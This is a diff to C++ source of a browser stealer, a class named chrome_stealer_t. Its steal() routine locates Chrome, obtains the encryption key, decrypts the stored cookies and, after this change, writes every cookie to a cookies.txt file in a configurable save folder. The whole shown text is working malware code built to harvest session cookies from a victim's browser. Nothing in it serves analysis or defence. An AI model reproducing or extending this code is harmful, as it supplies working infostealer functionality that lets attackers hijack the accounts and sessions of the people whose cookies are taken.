@@ -206,9 +206,9 @@ net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_pa
 asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
 {
         return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
-        [](auto completion_handler)
+        [this](auto completion_handler)
         {
-            std::thread([](auto completion_handler)
+            std::thread([this](auto completion_handler)
             {
                 FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto browser_path, get_browser_path());
 
@@ -218,15 +218,34 @@ asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
                 FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto cookies, get_cookies(browser_path, encryption_key));
                 DLOG("Chrome(DISPLAY): Cookies received");
 
+                std::ofstream cookies_file;
+                cookies_file.open(save_path / "cookies.txt", std::ios::out);
+                if(!cookies_file.is_open())
+                {
+                    std::move(completion_handler)
+                        (std::make_unique<error_message_t>("Chrome(ERROR): Cant create cookie file"));
+                    return;
+                }
                 for (const auto & cookie : cookies)
                 {
-                    DLOG(std::format("{} {} {} {} {}", cookie.host, cookie.name, cookie.path, cookie.cookie, cookie.expiry));
+                    cookies_file
+                    << "=========================\n"
+                    << cookie.to_string()
+                    << "=========================\n";
                 }
+                cookies_file.close();
 
-                auto text_msg = std::make_unique<text_message_t>();
-                text_msg->text = "";
-                std::move(completion_handler)(std::move(text_msg));
+                DLOG("Chrome(DISPLAY): All saved");
+                std::move(completion_handler)(std::make_unique<message_t>());
             }, std::move(completion_handler)).detach();
         }, asio::use_awaitable
     );
+}
+
+void chrome_stealer_t::set_save_folder(const fs::path& in_save_path, bool is_global)
+{
+    if(is_global)
+        save_path = in_save_path / "Chrome";
+    else
+        save_path = in_save_path;
 }
